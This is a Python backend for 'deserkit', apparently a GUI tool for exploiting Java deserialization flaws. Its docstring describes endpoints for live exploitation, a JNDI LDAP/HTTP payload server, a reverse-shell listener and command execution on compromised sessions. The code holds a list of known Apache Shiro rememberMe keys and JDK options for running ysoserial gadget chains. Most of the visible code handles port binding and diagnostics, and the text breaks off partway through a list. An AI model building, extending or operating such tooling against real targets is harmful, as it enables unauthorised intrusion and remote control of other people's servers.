# -*- coding: utf-8 -*-
"""
deserkit 图形化利用后端  ——  gui_server.py
纯标准库 + miniaes.py，无 pip 依赖。

启动:  python gui_server.py            (默认 127.0.0.1:8899，端口不可用时自动向后换)
       python gui_server.py --host 0.0.0.0 --port 8899
       python gui_server.py --strict-port          端口不可用时直接退出，不自动换端口
然后浏览器会自动打开 http://127.0.0.1:8899/

便携/降级设计（拷到任意 Windows / Linux / macOS 机器上都能起来）：
  · 端口被占 / 落在 Windows 保留端口区间(WinError 10013) → 自动向后探测可用端口，
    并在启动横幅、日志、前端界面里告知实际端口与可执行的修复命令。
  · 运行时写盘位置自动降级：HERE → %TEMP%\\deserkit-runtime 或 ~/.deserkit，
    不再因为放在 Program Files / 只读目录就崩。

对外接口:
  GET  /                      图形界面
  GET  /api/env               环境自检：本机IP / java / javac / ysoserial
                              + admin(是否管理员) / writable(脚本目录是否可写)
                              + runtime_dir(实际运行时目录) / ports(各端口预检)
                              + excluded_ports(Windows 保留区间) / advice(修复建议)
  POST /api/scan              指纹 + 版本探测
  POST /api/exploit           漏洞利用（真发包）
  POST /api/jndi              LDAP+HTTP(JNDI) 服务启停
  POST /api/listener          反弹Shell监听启停
  POST /api/shellcmd          对已上线的会话执行命令
  GET  /api/status            全局状态 / 回调记录
  GET  /cb/<tag>              出网回调记录（目标访问即留痕）
"""

import argparse
import base64
import hashlib
import http.server as httpsrv
import io
import json
import os
import platform
import random
import re
import shutil
import socket
import socketserver
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import webbrowser
import zipfile

from miniaes import aes_cbc_encrypt, aes_cbc_decrypt, aes_gcm_encrypt, aes_gcm_decrypt

HERE = os.path.dirname(os.path.abspath(__file__))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

# ============================================================
# 全局状态
# ============================================================
STATE = {
    "jndi": {"on": False, "ldap_port": 1389, "http_port": 8000,
             "cmd": "", "lhost": "", "payload_url": "", "compiled": False, "err": ""},
    "listener": {"on": False, "port": 4444},
    "sessions": {},          # sid -> {"sock","addr","ts","buf"}
    "callbacks": [],         # {"ts","type","from","detail"}
    "jobs": {},              # 预留
}
SESS_LOCK = threading.Lock()

SHIRO_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==",
    "5aaC5qKm5oqR9Z8ooPjaa==", "6AvVhmFLUs0KTA3Kprsdag==",
    "6ZiHmFLUs0KTA3Kprsdag==", "7AvVhmFLUs0KTA3Kprsdag==",
    "bWvKpMvlqOmyspJqQilqag==", "fCq+/xW488hMTCD+cmJ3aQ==",
    "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==",
    "U3ByaW5nQmxhZGUAAAAAAA==", "1QWLxg+NYmxraMoxAXu/Iw==",
    "a2V5AAAAAAAAAAAAAAAAAA==", "YWJjZGRjYmFhYWRkY2M=",
    "bXlTZWNyZXRLZXkudmFsdWU=", "ZmFrZUtleTEyMzQ1Ng==",
    "dGhpcyBpcyBhIHRlc3Qga2V5", "MTIzNDU2Nzg5MGFiY2RlZg==",
    "ZGVtb2tleTEyMzQ1Ng==", "c2hpcm9rZXkxMjM0NQ==",
    "6ZiHmFLUs0KTA3Kprsdag==", "cmVtZW1iZXJNZUtleQ==",
    "YWRtaW4xMjM0NTY3OA==", "MTIzMTIzMTIzMTIzMTIz",
    "c2VjcmV0AAAAAAAAAAAAAA==", "ZGVtb2RlbW8xMjM0NQ==",
    "RGVtb0FwcEtleTEyMzQ=", "cGFzc3dvcmQxMjM0NQ==",
]

# ============================================================
# 基础工具
# ============================================================
def now():
    return time.strftime("%H:%M:%S")


_LOG_PERSIST = {"enabled": True, "busy": False}


def _persist_log(line):
    """把日志追加进运行时目录的 _server.log；目录不可写则静默停写，不影响主流程。"""
    if not _LOG_PERSIST["enabled"] or _LOG_PERSIST["busy"]:
        return
    _LOG_PERSIST["busy"] = True
    try:
        path = os.path.join(runtime_dir(), "_server.log")
        try:
            # 简单自维护：超过 2MB 就从头写，避免长期运行把日志撑爆
            if os.path.getsize(path) > 2 * 1024 * 1024:
                with open(path, "w", encoding="utf-8") as f:
                    f.write("[日志超过 2MB，已重置]\n")
        except Exception:
            pass
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        _LOG_PERSIST["enabled"] = False
    finally:
        _LOG_PERSIST["busy"] = False


def log(msg, kind="info"):
    STATE.setdefault("_log", [])
    STATE["_log"].append({"ts": now(), "kind": kind, "msg": msg})
    if len(STATE["_log"]) > 500:
        STATE["_log"] = STATE["_log"][-500:]
    _persist_log("[%s][%s] %s" % (now(), kind, msg))


def add_callback(kind, src, detail):
    STATE["callbacks"].append({"ts": now(), "type": kind, "from": src, "detail": detail})
    if len(STATE["callbacks"]) > 300:
        STATE["callbacks"] = STATE["callbacks"][-300:]
    log("回调命中 [%s] %s %s" % (kind, src, detail), "hit")


# ============================================================
# 运行环境自适应
# 目标：换一台电脑 / 换到一个只读目录，"起不来"变成"自动降级 + 明确提示"。
#   · is_admin()        是否管理员 / root
#   · runtime_dir()     运行时目录：HERE 不可写时按平台降级（%TEMP% / ~/.deserkit）
#   · runtime_path()    所有写盘位置的唯一入口
#   · probe_port()      端口能否绑定的预检（带中文诊断）
#   · bind_*()          绑定失败自动向后探端口，绝不让整个服务起不来
# ============================================================
IS_WIN = (os.name == "nt")
PORT_DEFAULT = {"gui": 8899, "ldap": 1389, "http": 8000, "listener": 4444}
PORT_TRIES = 30          # 端口被占/被拒时，向后最多探测多少个候选端口
PORT_PRECHECK = 8        # 前多少个候选端口做"已有他人在监听"的探活（避免极端情况下扫太久）

_ADMIN_CACHE = {"v": None}
_RUNTIME = {"dir": None, "note": "", "writable_here": None}


def is_admin():
    """是否以管理员 / root 身份运行。结果缓存，可放心高频调用。"""
    if _ADMIN_CACHE["v"] is not None:
        return _ADMIN_CACHE["v"]
    ok = False
    try:
        if IS_WIN:
            import ctypes
            ok = bool(ctypes.windll.shell32.IsUserAnAdmin())
        else:
            ok = (hasattr(os, "geteuid") and os.geteuid() == 0)
    except Exception:
        ok = False
    _ADMIN_CACHE["v"] = ok
    return ok


def _dir_writable(d):
    """目录是否存在且可写可建（真写一个小文件验证，而不是只看 os.access）。"""
    try:
        os.makedirs(d, exist_ok=True)
        probe = os.path.join(d, ".deserkit_wtest.tmp")
        with open(probe, "wb") as f:
            f.write(b"x")
        os.remove(probe)
        return True
    except Exception:
        return False


def runtime_dir():
    """运行时目录：优先脚本所在目录 HERE，不可写时按平台降级。

    Windows → %TEMP%\\deserkit-runtime ；Linux/macOS → ~/.deserkit ；
    两者都不行 → 临时目录。降级原因记在 runtime_note()，供日志与前端展示。
    """
    if _RUNTIME["dir"]:
        return _RUNTIME["dir"]
    home = os.path.expanduser("~")
    if IS_WIN:
        base = os.environ.get("TEMP") or os.environ.get("TMP") or home
        fallback = os.path.join(base, "deserkit-runtime")
    else:
        fallback = os.path.join(home, ".deserkit")
    note = ""
    here_ok = _dir_writable(HERE)
    _RUNTIME["writable_here"] = here_ok
    if here_ok:
        chosen = HERE
    else:
        chosen = fallback if _dir_writable(fallback) else ""
        if chosen:
            note = ("脚本目录不可写（常见于 C:\\Program Files、C:\\ 根目录、只读U盘、"
                    "受控目录），运行时文件已自动降级写入：%s" % chosen)
        else:
            chosen = tempfile.mkdtemp(prefix="deserkit-")
            note = ("脚本目录与默认降级目录均不可写，本次会话的运行时文件写入临时目录：%s"
                    "（进程退出后可能丢失）" % chosen)
    _RUNTIME["dir"] = chosen
    _RUNTIME["note"] = note
    return chosen


def runtime_note():
    """返回本次会话是否有目录降级，以及降级后的实际路径。"""
    runtime_dir()
    return _RUNTIME["note"]


def runtime_path(name):
    """所有写盘位置都走这里，保证降级策略一致。"""
    try:
        return os.path.join(runtime_dir(), name)
    except Exception:
        return os.path.join(HERE, name)


def write_runtime_file(name, data):
    """写运行时文件，失败也不抛异常。

    Args:
        name: 文件名（相对运行时目录）。
        data: str → utf-8 文本；bytes/bytearray → 二进制。
    Returns:
        {"ok": bool, "path": str, "err": str}
    """
    binary = isinstance(data, (bytes, bytearray))
    mode = "wb" if binary else "w"
    last_err = ""
    for path in (runtime_path(name),
                 os.path.join(tempfile.gettempdir(),
                              "deserkit-" + os.path.basename(name))):
        try:
            d = os.path.dirname(path)
            if d:
                os.makedirs(d, exist_ok=True)
            with open(path, mode, **(dict() if binary else {"encoding": "utf-8"})) as f:
                f.write(data)
            return {"ok": True, "path": path, "err": ""}
        except Exception as e:
            last_err = "%s: %s" % (type(e).__name__, e)
    return {"ok": False, "path": "", "err": last_err}


def _sub_kwargs():
    """Windows 上跑子进程时不弹黑框。"""
    if not IS_WIN:
        return {}
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return {"startupinfo": si, "creationflags": 0x08000000}  # CREATE_NO_WINDOW
    except Exception:
        return {}


def windows_excluded_ranges():
    """读 Windows 保留端口区间（Hyper-V/WSL/Docker 会把大段端口圈走，导致 10013）。

    返回 {"ranges": [[lo,hi], ...], "raw": str, "dynamic": {"start":int,"num":int}}
    """
    if not IS_WIN:
        return {"ranges": [], "raw": "", "dynamic": {}}
    out = {"ranges": [], "raw": "", "dynamic": {}}
    try:
        r = subprocess.run(["netsh", "int", "ipv4", "show", "excludedportrange",
                            "protocol=tcp"],
                           capture_output=True, timeout=6, **_sub_kwargs())
        raw = (r.stdout or b"").decode("utf-8", "ignore")
    except Exception as e:
        return {"ranges": [], "raw": "读取失败: %s" % e, "dynamic": {}}
    out["raw"] = raw.strip()[:4000]
    for line in raw.splitlines():
        for a, b in re.findall(r"\b(\d{1,5})\s+(\d{1,5})\b", line):
            lo, hi = int(a), int(b)
            if 0 < lo <= hi <= 65535 and [lo, hi] not in out["ranges"]:
                out["ranges"].append([lo, hi])
    try:
        d = subprocess.run(["netsh", "int", "ipv4", "show", "dynamicport", "tcp"],
                           capture_output=True, timeout=6, **_sub_kwargs())
        dr = (d.stdout or b"").decode("utf-8", "ignore")
        ms = re.search(r"Start Port\s*:\s*(\d+)", dr)
        mn = re.search(r"Number of Ports\s*:\s*(\d+)", dr)
        if ms and mn:
            out["dynamic"] = {"start": int(ms.group(1)), "num": int(mn.group(1))}
    except Exception:
        pass
    return out


class _BindIssue(Exception):
    """内部异常：绑定前的探活已经判明原因时，用它复用 diagnose_bind_error 的话术。"""

    def __init__(self, kind, msg):
        super().__init__(msg)
        self.kind = kind


def _err_kind(e):
    """把绑定异常归类为 inuse / denied / other。"""
    forced = getattr(e, "kind", None)
    if forced in ("inuse", "denied", "other"):
        return forced
    werr = getattr(e, "winerror", None)
    eno = getattr(e, "errno", None)
    msg = str(e).lower()
    if werr == 10048 or eno == 98 or "already in use" in msg or "通常每个套接字地址" in msg:
        return "inuse"
    if werr == 10013 or eno == 13 or "permission denied" in msg or "以一种访问权限不允许" in msg:
        return "denied"
    return "other"


def diagnose_bind_error(port, e, role="服务", kind=None):
    """针对端口绑定失败给出可执行的中文诊断与修复建议。

    Args:
        port: 端口。
        e: 原始异常。
        role: 角色名（如 "JNDI/LDAP"），仅用于文案。
        kind: 强制指定归类（inuse / denied / other），用于上层已判明情况时覆盖。
    """
    kind = kind or _err_kind(e)
    head = "%s端口 %d 绑定失败：%s: %s" % (("%s " % role) if role else "",
                                        port, type(e).__name__, e)
    lines = [head]
    if kind == "denied":
        if IS_WIN:
            lines += [
                "＝＝ 这就是 Windows 经典的 WinError 10013（以一种访问权限不允许的方式做了一个访问套接字的尝试）＝＝",
                "最常见根因：该端口被 Windows 划进了「保留端口区间」（装了 Hyper-V / WSL2 / Docker / 某些 VPN 的机器非常常见）；",
                "              其次是安全软件独占、或进程无权绑定特权端口。",
                "① 自查保留区间：netsh int ipv4 show excludedportrange protocol=tcp",
                "② 自查动态端口池：netsh int ipv4 show dynamicport tcp",
                "③ 最省事的修法：换端口。本工具已自动向后探测，请把界面上显示的「实际端口」填给目标端。",
                "④ 想保住原端口：管理员 CMD 执行",
                "   netsh int ipv4 add excludedportrange protocol=tcp startport=%d numberofports=1" % port,
                "   把自己排进保留名单（重启后生效），或先停掉 WSL/Hyper-V：wsl --shutdown 后重试。",
                "⑤ 仍失败：检查 Defender/杀软、公司终端管控软件是否拦截本进程监听；",
                "   并确保入站已放行 —— 右键以管理员身份运行《放行端口-管理员运行.bat》。",
            ]
        elif port < 1024:
            lines += [
                "Linux / macOS 上 1-1023 属于特权端口，普通用户无权绑定。",
                "① sudo python3 gui_server.py --port %d" % port,
                "② 或授予绑定能力（免 root）：sudo setcap 'cap_net_bind_service=+ep' $(which python3)",
                "③ 或直接改用 1024 以上端口（本工具已自动向后探测）。",
            ]
        else:
            lines += [
                "非特权端口仍被拒，多半是 SELinux / AppArmor / 容器沙箱策略限制。",
                "① 查审计日志：sudo ausearch -m avc -ts recent （SELinux）",
                "② 容器场景确认带了 --network host 或做了端口映射",
                "③ 或改用其它端口（本工具已自动向后探测）。",
            ]
    elif kind == "inuse":
        if IS_WIN:
            lines += [
                "该端口已被别的进程占用：netstat -ano | findstr :%d  →  taskkill /PID <pid> /F" % port,
            ]
        else:
            lines += [
                "该端口已被别的进程占用：lsof -i :%d   或   ss -ltnp | grep :%d" % (port, port),
            ]
        lines.append("可换个端口启动，或不加 --strict-port 让工具自动向后探测下一个可用端口。")
    else:
        lines += [
            "未知错误。请确认 host 是本机网卡地址；不确定时用 --host 127.0.0.1（本机访问，最不容易被拦）。",
            "若目标机需要跨机访问，再改用本机真实内网 IP 并确保防火墙入站已放行。",
        ]
    return {"kind": kind, "text": "\n".join(lines)}


def _try_bind_once(port, host, reuse):
    """内部工具：绑定一次。成功返回 None，失败返回异常对象。"""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if reuse:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, int(port)))
        return None
    except Exception as e:
        return e
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass


def _has_listener(port, timeout=0.35):
    """端口上是否真有服务在 LISTEN（连一次，能连上说明有人占着）。"""
    hosts = ["127.0.0.1"]
    try:
        for ip in local_ips():
            if ip not in hosts:
                hosts.append(ip)
    except Exception:
        pass
    for h in hosts:
        s = None
        try:
            s = socket.create_connection((h, int(port)), timeout=timeout)
            return True, h
        except Exception:
            pass
        finally:
            try:
                if s:
                    s.close()
            except Exception:
                pass
    return False, ""


def _foreign_listener(port, timeout=0.2):
    """端口上是否已经有『不是本进程』的服务在监听。

    Windows 语义坑：对方绑 0.0.0.0:P、我们绑 127.0.0.1:P 时两者可以共存，
    bind 本身不会失败（操作系统按"更具体的地址优先"分发连接）。仅靠 bind 探测
    会漏掉这种情况，于是两个服务静默抢同一个端口、用户却以为是自己启的那个。
    所以绑定前主动探一次：先 connect，再用 /api/status 里的 pid 确认是不是本工具。
    """
    hosts = ["127.0.0.1"]
    try:
        for ip in local_ips():
            if ip not in hosts:
                hosts.append(ip)
    except Exception:
        pass
    for h in hosts:
        s = None
        try:
            s = socket.create_connection((h, int(port)), timeout=timeout)
        except Exception:
            continue
        finally:
            try:
                if s:
                    s.close()
            except Exception:
                pass
        try:
            with urllib.request.urlopen(
                    "http://%s:%d/api/status" % (h, int(port)),
                    timeout=max(0.5, timeout * 3)) as r:
                j = json.loads(r.read(8192).decode("utf-8", "ignore"))
            if isinstance(j, dict) and int(
                    (j.get("runtime") or {}).get("pid") or 0) == os.getpid():
                continue                       # 是本工具自己，不算冲突
        except Exception:
            pass
        return True, h
    return False, ""


def probe_port(port, host="0.0.0.0"):
    """预检某 TCP 端口能否绑定，并尽量说清"为什么不能"。

    Windows 有个坑：别人未开 SO_REUSEADDR 独占端口时，我们带上 SO_REUSEADDR
    去绑会拿到 WinError 10013（"权限不足"），很容易误判成权限问题。所以这里分两步：
      ① 不开 REUSE 先试一次（成功 = 端口完全空闲）；
      ② 失败后再按服务端真实配置（开 REUSE）试一次：能绑 = 只是 TIME_WAIT 残留；
      ③ 两次都不行时，用一次 connect 判断到底"有人占"还是"真被权限/保留区间拦住"。
    """
    port = int(port)
    res = {"port": port, "host": host, "ok": False,
           "kind": "other", "err": "", "advice": "", "note": ""}
    strict = _try_bind_once(port, host, reuse=False)
    if strict is None:
        res.update({"ok": True, "kind": "free"})
        return res
    loose = _try_bind_once(port, host, reuse=True)
    if loose is None:
        # 严格绑不了、按服务端配置能绑：只是残留连接占着名字，服务端实际可用
        res.update({"ok": True, "kind": "free(timewait)",
                    "err": "%s: %s" % (type(strict).__name__, strict),
                    "note": "存在 TIME_WAIT/FIN_WAIT 残留连接，服务端（SO_REUSEADDR）可正常绑定"})
        return res
    listening, lhost = _has_listener(port)
    if listening:
        err = "%s: %s" % (type(strict).__name__, strict)
        if _err_kind(strict) == "denied":
            err += "（Windows 特性：对方未共享端口时表现为 WinError 10013，实为端口被占）"
        res.update({"kind": "inuse", "err": err,
                    "note": ("%s:%d 已有服务在 LISTEN，确认是别人的进程还是本工具的旧实例"
                             % (lhost, port))})
    else:
        res.update({"kind": _err_kind(loose),
                    "err": "%s: %s" % (type(loose).__name__, loose)})
    res["advice"] = diagnose_bind_error(port, loose, role="", kind=res["kind"])["text"]
    return res


def _attempt_notes(requested, actual, role):
    if actual is not None and int(actual) != int(requested):
        return ["%s 端口 %d 不可用，已自动改用 %d（请把实际端口告知对端）"
                % (role, int(requested), int(actual))]
    return []


# ── 设计决定存档（QA 提的 R1 / R2，改之前先看这里）────────────────────────
# R2（QA 建议）：给 socket 加 SO_EXCLUSIVEADDRUSE，让端口被占时一律报 10048。
#     结论：**不采纳**。
#       1) 反弹 shell 的工作流是「停止监听 → 立刻重启同一个端口」；旧连接处于
#          TIME_WAIT 时，EXCLUSIVEADDRUSE 会让重新绑定直接失败（WSAEADDRINUSE），
#          等于把本来能用的端口变成用不了 —— 这比 10013/10048 混淆更难受。
#       2) R1 的「预绑定探测 + 外来监听识别」已经覆盖了「端口被别人占着」的场景；
#          EXCLUSIVEADDRUSE 唯一的额外收益只是把 10013 变成 10048，而这两种错误码
#          最终都走同一套自动顺延逻辑，换不换没差别。
#     所以本文件所有 socket 统一只用 SO_REUSEADDR（allow_reuse_address）。
# R1（QA 报的问题）：占用者绑 0.0.0.0:P、本工具绑 127.0.0.1:P 时，Windows 允许二者
#     共存（更具体的地址优先），bind 会成功、但两个服务互相抢连接，也不会触发顺延。
#     对策：bind 成功后再做一次「外来监听」探测（见 _foreign_listener：连上去比对
#     /api/status 里的 pid），发现端口上已有别的进程在听就当作占用，继续往后顺延。
# ────────────────────────────────────────────────────────────────────────
def bind_tcp_server(cls, handler, port, host="0.0.0.0", tries=PORT_TRIES,
                    role="服务", alt_host=None):
    """按 port、port+1 … 依次尝试创建 socketserver 服务端（构造即 bind）。

    Args:
        cls: socketserver 子类（如 _MainServer / ThreadingTCPServer）。
        handler: 请求处理类。
        port: 首选端口。
        host: 监听地址。
        tries: 最多向后探测多少个候选端口。
        role: 角色名，仅用于日志与提示文案。
        alt_host: 所有候选端口在 host 上失败时，最后再试一次的地址（GUI 用，通常传 127.0.0.1）。
    Returns:
        (server, actual_port, info)；全部失败时 server / actual_port 为 None。
        info = {"requested","actual","host","changed","notes","advice","tried"}
    """
    info = {"requested": int(port), "actual": None, "host": host, "changed": False,
            "notes": [], "advice": "", "tried": []}
    last_err = None
    hosts = [host] + ([alt_host] if alt_host and alt_host != host else [])
    for h in hosts:
        for i in range(max(1, int(tries))):
            cand = int(port) + i
            if cand > 65535:
                break
            # 绑定前探活：Windows 下"别人占 0.0.0.0:P、我绑 127.0.0.1:P"会被系统
            # 允许共存，bind 不报错却会和别人抢流量，所以这里主动发现并顺延到下一个端口。
            if i < PORT_PRECHECK:
                foreign, who = _foreign_listener(cand)
                if foreign:
                    last_err = _BindIssue(
                        "inuse", "%s:%d 已有其他服务在监听（非本进程）" % (who, cand))
                    info["tried"].append({"host": h, "port": cand,
                                          "err": str(last_err)})
                    continue
            try:
                srv = cls((h, cand), handler)
            except Exception as e:
                last_err = e
                info["tried"].append({"host": h, "port": cand,
                                      "err": "%s: %s" % (type(e).__name__, e)})
                continue
            info.update({"actual": cand, "host": h, "changed": cand != int(port)})
            info["notes"] = _attempt_notes(int(port), cand, role)
            if h != host:
                info["notes"].append(
                    "%s 无法绑定 %s，已降级监听 %s（仅本机可访问）" % (role, host, h))
            for n in info["notes"]:
                log(n, "warn")
            return srv, cand, info
        if h != host:
            break
    if last_err is not None:
        # 用 probe_port 复核一次：把 Windows 上"被别人占"误报成"权限不足"的情况纠正回来
        pr = probe_port(int(port), host)
        if not pr["ok"]:
            info["advice"] = pr["advice"]
            info["kind"] = pr["kind"]
            info["probe"] = pr
        else:
            d = diagnose_bind_error(int(port), last_err, role)
            info["advice"] = d["text"]
            info["kind"] = d["kind"]
    return None, None, info


def bind_socket(port, host="0.0.0.0", tries=PORT_TRIES, backlog=20, role="监听"):
    """同上，但返回一个已 bind+listen 的裸 socket（反弹 shell 监听用）。"""
    info = {"requested": int(port), "actual": None, "host": host, "changed": False,
            "notes": [], "advice": "", "tried": []}
    last_err = None
    for i in range(max(1, int(tries))):
        cand = int(port) + i
        if cand > 65535:
            break
        if i < PORT_PRECHECK:
            foreign, who = _foreign_listener(cand)
            if foreign:
                last_err = _BindIssue(
                    "inuse", "%s:%d 已有其他服务在监听（非本进程）" % (who, cand))
                info["tried"].append({"host": host, "port": cand,
                                      "err": str(last_err)})
                continue
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, cand))
            s.listen(backlog)
            info.update({"actual": cand, "changed": cand != int(port)})
            info["notes"] = _attempt_notes(int(port), cand, role)
            for n in info["notes"]:
                log(n, "warn")
            return s, cand, info
        except Exception as e:
            last_err = e
            info["tried"].append({"host": host, "port": cand,
                                  "err": "%s: %s" % (type(e).__name__, e)})
            try:
                if s:
                    s.close()
            except Exception:
                pass
    if last_err is not None:
        pr = probe_port(int(port), host)
        if not pr["ok"]:
            info["advice"] = pr["advice"]
            info["kind"] = pr["kind"]
            info["probe"] = pr
        else:
            d = diagnose_bind_error(int(port), last_err, role)
            info["advice"] = d["text"]
            info["kind"] = d["kind"]
    return None, None, info


def env_selfcheck(gui_port=None):
    """/api/env 用的环境自检：权限、写目录、端口可用性、依赖工具。"""
    rd = runtime_dir()
    note = runtime_note()
    ex = windows_excluded_ranges() if IS_WIN else {"ranges": [], "raw": "", "dynamic": {}}

    def in_excluded(p):
        return any(lo <= p <= hi for lo, hi in ex["ranges"])

    gui_port = int(gui_port or STATE.get("gui_port") or PORT_DEFAULT["gui"])
    # 预检必须用和服务端完全一样的监听地址才有意义：
    # Windows 上 "别人占 0.0.0.0:8899 + 我绑 127.0.0.1:8899" 是允许共存的，反之亦然。
    gui_host = STATE.get("gui_host") or "127.0.0.1"
    roles = [("gui", "GUI 界面", gui_port, gui_host),
             ("ldap", "JNDI/LDAP", int(STATE["jndi"].get("ldap_port") or PORT_DEFAULT["ldap"]), "0.0.0.0"),
             ("http", "JNDI/HTTP(codebase)", int(STATE["jndi"].get("http_port") or PORT_DEFAULT["http"]), "0.0.0.0"),
             ("listener", "反弹Shell监听", int(STATE["listener"].get("port") or PORT_DEFAULT["listener"]), "0.0.0.0")]
    # 本工具自己已占用的端口：预检时会显示为占用，这里直接标为 self，避免"自己占自己"的误报
    owned = set()
    if STATE.get("gui_port"):
        owned.add(int(STATE["gui_port"]))
    if STATE["jndi"].get("on"):
        owned.add(int(STATE["jndi"].get("ldap_port") or 0))
        owned.add(int(STATE["jndi"].get("http_port") or 0))
    if STATE["listener"].get("on"):
        owned.add(int(STATE["listener"].get("port") or 0))
    owned.discard(0)
    ports = {}
    advice = []
    for key, label, p, host in roles:
        excluded = in_excluded(p)
        if p in owned:
            ports[key] = {"port": p, "host": host, "ok": True, "kind": "self",
                          "err": "", "advice": "", "note": "", "label": label,
                          "excluded": excluded}
            continue
        r = probe_port(p, host)
        r["label"] = label
        r["excluded"] = excluded
        ports[key] = r
        if not r["ok"]:
            advice.append("%s 端口 %d 预检不可用（%s）" % (label, p, r["kind"]))
        elif excluded:
            advice.append("%s 端口 %d 落在 Windows 保留端口区间内，换机器/重启后可能变成 WinError 10013"
                          % (label, p))
    advice = list(dict.fromkeys(advice))
    if note:
        advice.append(note)
    if IS_WIN and not is_admin():
        advice.append("当前非管理员身份运行；绑定特权端口或被保留区间拦住时可能失败，"
                      "按需右键《放行端口-管理员运行.bat》以管理员身份放行入站。")
    return {
        "ips": local_ips(),
        "java": bool(shutil.which("java")),
        "javac": bool(shutil.which("javac")),
        "yso": find_ysoserial(),
        "comps": [{"id": k, "name": CHECKS[k].__name__} for k in ALL],
        "py": platform.python_version(),
        "py_path": sys.executable or "",
        "os": "%s %s" % (platform.system(), platform.release()),
        "hostname": platform.node(),
        "admin": is_admin(),
        "writable": bool(_RUNTIME["writable_here"]),
        "runtime_dir": rd,
        "runtime_note": note,
        "readonly": not bool(_RUNTIME["writable_here"]),
        "excluded_ports": ex["ranges"],
        "excluded_raw": ex["raw"],
        "dynamic_port": ex["dynamic"],
        "ports": ports,
        "advice": advice,
        "gui_port": gui_port,
        "pid": os.getpid(),
    }


def normalize(url):
    url = (url or "").strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def get_root(url):
    m = urllib.parse.urlparse(url)
    return "%s://%s" % (m.scheme, m.netloc)


def _tolerant_read(resp, n):
    """读响应体，容忍服务器提前断开：IncompleteRead 时取已收到的部分（如 S2-045 的
    outputStream 回显——写完 5 字节就断流，urllib 会抛异常但 curl 能看到数据）。"""
    try:
        return resp.read(n).decode("utf-8", "ignore")
    except Exception as e:
        partial = getattr(e, "partial", None)
        if partial:
            return partial.decode("utf-8", "ignore")
        raise


def http(url, method="GET", headers=None, data=None, timeout=8,
         allow_redirect=True, ctype="application/json", raw=False):
    """返回 dict: status / headers / body / err"""
    res = {"status": 0, "headers": {}, "body": "", "err": ""}
    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", UA)
    if data is not None and not raw:
        if isinstance(data, str):
            data = data.encode("utf-8", "ignore")
        req.add_header("Content-Type", ctype)
    elif data is not None:
        req.add_header("Content-Type", ctype)
    for k, v in (headers or {}).items():
        try:
            req.add_header(k, v)
        except Exception:
            pass
    try:
        handlers = [urllib.request.HTTPSHandler(context=SSL_CTX)]
        if not allow_redirect:
            handlers.append(urllib.request.HTTPRedirectHandler())
        opener = urllib.request.build_opener(*handlers)
        with opener.open(req, data=data, timeout=timeout) as r:
            res["status"] = r.status
            res["headers"] = {k.lower(): v for k, v in r.getheaders()}
            res["body"] = _tolerant_read(r, 200000)
    except urllib.error.HTTPError as e:
        res["status"] = e.code
        res["headers"] = {k.lower(): v for k, v in (e.headers or {}).items()}
        try:
            res["body"] = _tolerant_read(e, 30000)
        except Exception:
            pass
    except Exception as e:
        res["err"] = "%s: %s" % (type(e).__name__, e)
    return res


def local_ips():
    ips = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("223.5.5.5", 80))
        ips.append(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    try:
        hn = socket.gethostname()
        for info in socket.getaddrinfo(hn, None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips and not ip.startswith("127."):
                ips.append(ip)
    except Exception:
        pass
    return ips or ["127.0.0.1"]


def src_ip_for(host):
    """按系统路由表算出：本机去往 host 时会用哪个源 IP 发包。"""
    try:
        if "//" in host:
            host = urllib.parse.urlparse(host).hostname or host
        host = host.split(":")[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def is_private_ip(ip):
    try:
        import ipaddress
        a = ipaddress.ip_address(ip)
        return (a.is_private or a.is_loopback or a.is_link_local
                or a.is_reserved or a.is_unspecified)
    except Exception:
        return True


def find_ysoserial():
    for p in (os.path.join(HERE, "ysoserial.jar"),
              os.path.join(HERE, "tools", "ysoserial.jar"),
              os.path.join(HERE, "ysoserial-all.jar")):
        if os.path.isfile(p):
            return p
    return ""


# JDK9+ 跑 ysoserial 会因为模块封装报 IllegalAccessError / InaccessibleObjectException，
# 需要放开这些内部包；JDK8 不认识 --add-opens/--add-exports，必须按版本决定是否附加。
_JDK9_ADDOPS = [
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens=java.xml/com.sun.org.apache.xml.internal.utils=ALL-UNNAMED",
    "--add-opens=java.management/javax.management=ALL-UNNAMED",
    "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
    "--add-opens=java.base/java.lang=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED",
    "--add-opens=java.base/java.net=ALL-UNNAMED",   # URLDNS 链要用（JDK9+ 才会附加）
    "--add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED",
    "--add-opens=java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED",
